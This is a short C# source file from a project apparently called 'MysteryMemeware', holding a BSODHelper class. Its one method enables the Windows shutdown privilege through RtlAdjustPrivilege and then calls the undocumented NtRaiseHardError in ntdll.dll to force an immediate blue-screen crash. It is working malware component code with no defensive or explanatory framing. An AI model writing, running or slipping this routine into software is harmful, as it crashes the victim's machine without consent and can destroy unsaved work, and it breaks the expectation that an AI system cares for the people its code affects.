using System;
using System.Runtime.InteropServices;
namespace MysteryMemeware.Helpers
{
    public static class BSODHelper
    {
        public static void RaiseHardException(uint stopCode = 0xc0000022)
        {
            RtlAdjustPrivilege(19, true, false, out bool output0);
            NtRaiseHardError(stopCode, 0, 0, IntPtr.Zero, 6, out uint output1);
        }
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    }
}
